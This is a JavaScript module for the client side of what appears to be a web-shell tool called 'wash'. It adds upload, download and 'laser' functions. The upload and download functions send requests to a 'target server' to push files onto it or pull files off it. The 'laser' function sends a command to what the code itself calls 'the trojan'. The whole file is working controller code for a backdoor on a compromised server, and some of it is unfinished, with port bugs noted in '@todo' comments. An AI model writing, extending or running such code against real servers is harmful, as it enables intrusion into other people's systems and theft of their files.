// Here we pop open the wash object once again to patch in some tailored
// functionality.
wash.file = {
    // uploads files to the target server
    up: function(){
        console.log('up');

        // alert the user if we're switching to POST from another request type
        if(wash.connection.request_type != 'post'){
            var msg = "In order to download a file, a POST request must necessarily " +
                      "be made to the target server. Continue?";
            
            // cancel if the user is unwilling to change request types
            if(!confirm(msg)){ return false; }
        }

        // aggregate the HTML
        var html = "<p>Select files to upload:</p>" +
        "<form id='wash_file_up' enctype='multipart/form-data' onsubmit='javascript:return wash.file.upload()'>" + 
            "<input type='file' name='files[]' multiple>" + 
            "<input type='hidden' name='action' value='payload_file_up'>" + 
            "<br><input type='submit' value='Upload'>" + 
        "</form>";

        // reveal the sidebar
        shell.sidebar.show();
        shell.elements.sidebar.html(html);
    },

    // no user should ever invoke this. It's sort of a "private" method
    upload: function(){
        $.post(
            // @todo: support custom ports later
            wash.connection.protocol + '://' + wash.connection.domain + wash.connection.url,
            $('#wash_file_up').serializeArray(),
            function(response){
                console.log(response);
            }
        );

        // prevent the form from actually submitting
        return false;
    },

    // downloads a file
    down: function(args){
        // alert the user if we're switching to GET from another request type
        if(wash.connection.request_type != 'get'){
            var msg = "In order to download a file, a GET request must necessarily " +
                      "be made against the target server. Continue?";
            
            // cancel if the user is unwilling to change request types
            if(!confirm(msg)){ return false; }
        }

        // assemble the URL for the file download
        var url = wash.connection.protocol + '://';
        // @todo @bug: deal with the port here
        url += wash.connection.url + '?';
        url += 'args[file]=' + args.file + '&';
        url += 'action=payload_file_down';

        // download the file
        window.location.href = url;
    },

    laser: function(){
        // assemble the command to send to the trojan
        wash.command.action = 'payload_laser';
        wash.command.args   = {} ;

        // send the request upstream
        wash.send_and_receive();
    },
}
